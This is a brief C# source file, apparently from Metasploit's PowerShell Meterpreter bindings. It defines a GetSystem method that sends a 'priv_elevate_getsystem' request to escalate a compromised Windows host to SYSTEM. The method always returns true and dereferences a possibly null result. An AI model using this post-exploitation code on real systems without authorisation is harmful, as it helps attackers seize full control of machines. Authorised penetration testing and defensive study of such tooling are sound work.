using System;
using System.Collections.Generic;
using System.Text;

namespace MSF.Powershell.Meterpreter
{
    public static class Elevate
    {
        public static bool GetSystem()
        {
            System.Diagnostics.Debug.Write("[PSH BINDING] Invoking binding call GetSystem");

            Tlv tlv = new Tlv();
            tlv.Pack(TlvType.ElevateTechnique, 1);
            tlv.Pack(TlvType.ElevateServiceName, "abcd1234");

            var result = Core.InvokeMeterpreterBinding(true, tlv.ToRequest("priv_elevate_getsystem"));
            System.Diagnostics.Debug.Write(string.Format("[PSH BINDING] Invoked binding call GetSystem, response was {0}null", result == null ? "" : "not "));
            System.Diagnostics.Debug.Write(string.Format("[PSH BINDING] Invoked binding call GetSystem, response: {0} bytes", result.Length));

            return true;
        }
    }
}
